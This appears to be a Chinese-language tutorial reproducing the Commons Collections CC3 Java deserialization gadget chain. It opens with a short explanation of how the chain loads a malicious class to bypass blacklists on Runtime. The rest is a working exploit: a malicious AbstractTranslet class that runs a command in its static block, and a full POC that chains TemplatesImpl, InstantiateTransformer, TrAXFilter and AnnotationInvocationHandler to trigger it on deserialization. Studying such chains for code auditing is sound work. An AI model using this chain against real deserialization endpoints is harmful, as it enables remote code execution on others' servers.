CC1 链与 CC6 链是通过 Runtime.exec() 进行命令执行的。而很多时候服务器的代码当中的黑名单会选择禁用 Runtime。​
CC3 链则是通过动态加载类加载机制来实现自动执行恶意类代码的。
## **复现**
加载class如下：javac test.java 变成.class
```
package com.llu.chain.cc3;

import java.io.IOException;  
          
import com.sun.org.apache.xalan.internal.xsltc.DOM;  
import com.sun.org.apache.xalan.internal.xsltc.TransletException;  
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;  
          
public class test extends AbstractTranslet{  
    static {  
        try {  
            Runtime.getRuntime().exec("calc");  
        } catch (IOException e) {  
            e.printStackTrace();  
        }  
    }  
              
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {  
  
    }  
              
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {  
  
    }  
}
```
代码
```
public class POC {
    public static void main(String[] args) throws TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {

        TemplatesImpl templates= new TemplatesImpl(); 
 
        Class tc=templates.getClass(); 
        Field namefield = tc.getDeclaredField("_name"); 
        namefield.setAccessible(true); 
        namefield.set(templates,"aaa"); 
        Field bytecodefield = tc.getDeclaredField("_bytecodes"); 
        bytecodefield.setAccessible(true); 
        //赋给我们的字节码,二维数组，代码会循环遍历
        byte[] code= Files.readAllBytes(Paths.get("E:\\Users\\Administrator.DESKTOP-L9N4RF9\\Desktop\\Java代码审计\\code\\code-classLoadAndReflcetAndSerial\\src\\main\\java\\com\\llu\\chain\\cc3\\test.class"));;
        byte [][]  codes={code}; 
        bytecodefield.set(templates,codes); 
 
        Field tfactoryfield = tc.getDeclaredField("_tfactory"); 
        tfactoryfield.setAccessible(true); 
        //在readObject中赋值了new TransformerFactoryImpl() 
        tfactoryfield.set(templates,new TransformerFactoryImpl()); 
 
//        templates.newTransformer(); 
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates}); 
        // instantiateTransformer.transform(TrAXFilter.class); 
 
 
        Transformer[] transformers=new Transformer[]{ 
        new ConstantTransformer(TrAXFilter.class), 
        instantiateTransformer
        };
// 
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); 
        HashMap<Object, Object> hashMap = new HashMap<>(); 
        hashMap.put("value","hu"); 
        Map<Object,Object> decorateMap = TransformedMap.decorate(hashMap, null, chainedTransformer); 
 
        Class c=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); 
        Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class); 
        constructor.setAccessible(true); 
        Object o = constructor.newInstance(Target.class, decorateMap); 
        serialize(o);
        unserialize("ser1.bin");

    }
    public static void serialize(Object obj) throws IOException, IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser1.bin"));
        oos.writeObject(obj);

    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```
